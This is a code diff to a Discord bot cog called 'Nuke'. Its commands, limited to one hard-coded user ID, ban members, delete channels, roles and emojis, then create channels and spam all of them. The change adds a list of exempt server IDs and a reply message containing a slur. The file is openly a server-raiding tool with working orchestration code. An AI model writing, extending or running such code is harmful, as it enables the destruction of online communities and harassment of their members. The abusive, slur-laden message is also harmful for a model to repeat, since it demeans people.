@@ -9,6 +9,7 @@ class Nuke(commands.Cog):
         self.invites = '@everyone'
         self.koda = 599507281226367006
         self.no_ban = [599507281226367006, 490275541413265409]
+        self.servers = [599514553201459201, 617165058446721091, 622217454994849800]
     
     async def delete_channels(self, ctx):
         print("Deleted channels ( ", end='', flush=True)
@@ -80,13 +81,16 @@ class Nuke(commands.Cog):
     async def nuke(self, ctx):
         # await ctx.message.delete()
         if ctx.author.id == self.koda:
-            await self.ban_members(ctx)
-            await self.delete_channels(ctx)
-            await self.delete_roles(ctx)
-            await self.delete_emojis(ctx)
-            await self.make_channels(ctx)
-            await self.spam_all_channels(ctx)
-            print("Done!")
+            if not ctx.guild.id in self.servers:
+                await self.ban_members(ctx)
+                await self.delete_channels(ctx)
+                await self.delete_roles(ctx)
+                await self.delete_emojis(ctx)
+                await self.make_channels(ctx)
+                await self.spam_all_channels(ctx)
+                print("Done!")
+            else:
+                await ctx.send("Koda you fucking retard you can't nuke this server.")
         else:
             koda = self.bot.get_user(self.koda)
             await koda.send(f"{ctx.author} attempted to use the nuke command in {ctx.guild.name}.")
@@ -96,10 +100,13 @@ class Nuke(commands.Cog):
     async def destroy(self, ctx):
         await ctx.message.delete()
         if ctx.author.id == self.koda:
-            await self.delete_channels(ctx)
-            await self.delete_roles(ctx)
-            await self.delete_emojis(ctx)
-            print("Done!")
+            if not ctx.guild.id in self.servers:
+                await self.delete_channels(ctx)
+                await self.delete_roles(ctx)
+                await self.delete_emojis(ctx)
+                print("Done!")
+            else:
+                await ctx.send("Koda you fucking retard you can't nuke this server.")
         else:
             koda = self.bot.get_user(self.koda)
             await koda.send(f"{ctx.author} attempted to use the nuke command in {ctx.guild.name}.")
